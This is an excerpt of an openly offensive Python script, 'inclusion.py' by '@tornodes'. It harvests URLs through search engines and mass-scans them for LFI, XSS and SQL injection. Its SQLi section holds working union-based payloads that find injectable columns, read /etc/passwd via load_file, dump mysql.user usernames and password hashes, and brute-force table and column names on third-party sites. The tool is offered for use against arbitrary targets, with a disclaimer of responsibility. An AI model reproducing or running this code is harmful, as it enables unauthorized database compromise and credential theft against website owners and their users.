...
# I won't be responsible for your stupidity.
# Toolname        : inclusion.py
# Coder           : @tornodes
# Version         : 1.0
# greetz from all the members of F.T.P.
#
...
def logo():
	print R+"n|----------------------------------------------------------------|"
        print "|                                                               |"
        print "|       _______                        ___                      |"
        print "|       |_   _|__  _ __ _ __   ___   __| | ___  ___             |"
        print "|         | |/ _ \| '__| '_ \ / _ \ / _` |/ _ \/ __|            |"
        print "|         | | (_) | |  | | | | (_) | (_| |  __/\__ \            |"
        print "|         |_|\___/|_|  |_| |_|\___/ \__,_|\___||___/            |"
        print "|                                                               |"
        print "|           inclusion v1                                        |"
        print "|                                                               |"
        print "|                   by: @tornodes                               |"
...
def search(inurl, maxc):
  ...
  for site in sitearray:
	...
	sys.stdout.flush()
      ...
      pass
  tmplist = []
  print "nn[+] URLS (unsorted): ",len(urls)
  for url in urls:
    try:
      host = url.split("/",3)
      domain = host[2]
...
def ClassicLFI(url):
  ...
  for lfi in lfis:
    try:
      check = urllib2.urlopen(lfiurl+lfi.replace("n", "")).read()
...
def ClassicXSS(url):
  for xss in xsses:
    try:
      source = urllib2.urlopen(url+xss.replace("n","")).read()
      if re.findall("XSS by tornodes", source):
	print R+"[!] w00t!,w00t!: ", O+url+xss,R+" ---> XSS Found (might be false)"
	xss_log_file.write("n"+url+xss)
	vuln.append(url+xss)
    except:
      pass

def injtest():
  print B+"n[+] Preparing for SQLi scanning ..."
...
def lfitest():
  print B+"n[+] Preparing for LFI - RCE scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
...
def xsstest():
  print B+"n[+] Preparing for XSS scanning ..."
  print "[+] Can take a while ..."
  print "[!] Working ...n"
  i = len(usearch) / int(numthreads)
  m = len(usearch) % int(numthreads)
...
while menu == True:
  ...
  if chce == '2':
    injtest()
    print B+"n[+] Preparing for Column Finder ..."
    print "[+] Can take a while ..."
    print "[!] Working ..."
    # F.T.P. Gangg
    for host in col:
      print R+"n[+] Target: ", O+host
	...
	try:
	  ...
	  for y in checkfor:
	    ...
	    if len(colFound) >= 1:
	      print "n[+] Column length is:", len(checkfor)
		...
		makepretty += str(z)
	      ...
	      site = site.replace(","+nullcol[0]+",",",FTP,")
	      site = site.replace(arg_eva+nullcol[0]+",",arg_eva+"FTP,")
	      site = site.replace(","+nullcol[0],",FTP")
	      print "[+] FTP URL:", site
	      darkurl.append(site)
	      print "[-] Done!n"
      ...
      print "n[!] Sorry column length could not be found"

      #########

    print B+"n[+] Gathering MySQL Server Configuration..."
    for site in darkurl:
      head_URL = site.replace("FTP", "concat(0x1e,0x1e,version(),0x1e,user(),0x1e,database(),0x1e,0x20)")+arg_end
      print R+"n[+] Target:", O+site
      while 1:
	try:
	  gets += 1
	  source = urllib2.urlopen(head_URL).read()
	  match = re.findall("x1ex1eS+", source)
	  if len(match) >= 1:
	    match = match[0][2:].split("x1e")
	    version = match[0]
	    user = match[1]
	    database = match[2]
	    print W+"ntDatabase:", database
	    print "tUser:", user
	    print "tVersion:", version
	    version = version[0]

	    load = site.replace("FTP", "load_file(0x2f6574632f706173737764)")
	    source = urllib2.urlopen(load).read()
	    if re.findall("root:x", source):
	      load = site.replace("FTP","concat_ws(char(58),load_file(0x"+file.encode("hex")+"),0x62616c74617a6172)")
	      source = urllib2.urlopen(load).read()
	      search = re.findall("baltazar",source)
	      if len(search) > 0:
		print "n[!] w00t!w00t!: "+site.replace("FTP", "load_file(0x"+file.encode("hex")+")")

	    load = site.replace("FTP", "concat_ws(char(58),user,password,0x62616c74617a6172)")+arg_eva+"from"+arg_eva+"mysql.user"
	    source = urllib2.urlopen(load).read()
	    if re.findall("baltazar", source):
	      print "n[!] w00t!w00t!: "+site.replace("FTP", "concat_ws(char(58),user,password)")+arg_eva+"from"+arg_eva+"mysql.user"

	  print W+"n[+] Number of tables:",len(tables)
	  print "[+] Number of columns:",len(columns)
          print "[+] Checking for tables and columns..."
          target = site.replace("FTP", "0x62616c74617a6172")+arg_eva+"from"+arg_eva+"T"
	  for table in tables:
            try:
	      target_table = target.replace("T", table)
	      source = urllib2.urlopen(target_table).read()
	      search = re.findall("tornodes", source)
	      if len(search) > 0:
		print "n[!] w00t!w00t! Found a table called: < "+table+" >"
		print "n[+] Lets check for columns inside table < "+table+" >"
		for column in columns:
		  try:
		    source = urllib2.urlopen(target_table.replace("0x62616c74617a6172", "concat_ws(char(58),0x62616c74617a6172,"+column+")")).read()
		    search = re.findall("tornodes", source)
		    if len(search) > 0:
		      print "t[!] w00t!w00t! Found a column called: < "+column+" >"
		  except(KeyboardInterrupt, SystemExit):
		    raise
		  except(urllib2.URLErrr, socket.gaierror, socket.error, socket.timeout):
		    pass

		print "n[-] Done searching inside table < "+table+" > for columns!"
  ...
  if chce == '9':
    print B+"nSaving valid urls ("+str(len(finallist))+") to file"
  ...
  if chce == '10':
    print W+"nPrinting valid urls:n"
    finallist.sort()
    for t in finallist:
      print B+t

  if chce == '11':
    print B+"nVuln found ",len(vuln)
